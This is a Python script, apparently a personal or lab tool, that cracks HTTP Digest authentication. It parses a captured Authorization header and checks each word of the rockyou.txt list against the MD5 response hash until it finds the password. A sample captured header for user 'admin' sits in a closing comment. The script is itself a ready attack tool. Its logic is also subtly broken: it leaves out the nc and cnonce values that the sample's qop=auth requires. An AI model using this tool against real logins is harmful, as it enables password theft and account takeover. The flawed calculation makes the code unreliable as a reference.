import _md5


def inputs():
    authReq = input('Enter the auth request: ')
    authReq = authReq.split(',')
    responseRequest = authReq[5].split('=')[1].strip('"')
    nonce = authReq[2].split('=')[1].strip('"')
    username = authReq[0].split('=')[1].strip('"')
    realm = authReq[1].split('=')[1].strip('"')
    uri = authReq[3].split('=')[1].strip('"')
    method = input('method: ')
    return responseRequest, nonce, username, realm, method, uri


responseRequest, nonce, username, realm, method, uri = inputs()

A2 = _md5.md5((method + ':' + uri).encode('utf-8')).hexdigest()
with open('rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        line = line.strip()
        print(line)
        A1 = _md5.md5((username + ':' + realm + ':' + line).encode('utf-8')).hexdigest()
        response = _md5.md5((A1 + ':' + nonce + ':' + A2).encode('utf-8')).hexdigest()
        if response == responseRequest:
            print(f'Password found: {line}')
            break

# > Authorization: Digest username="admin", realm="admin@mattkozlowski.pl", nonce="5989dbc65d16af617b00b8f676115976", uri="/digest-auth/auth/user/passwd", qop=auth, response="26c9e9afa4a391a429dbd5c0b3335c0d", opaque="d74b51f925af321d3bb20ab544b2ca4e", algorithm=MD5
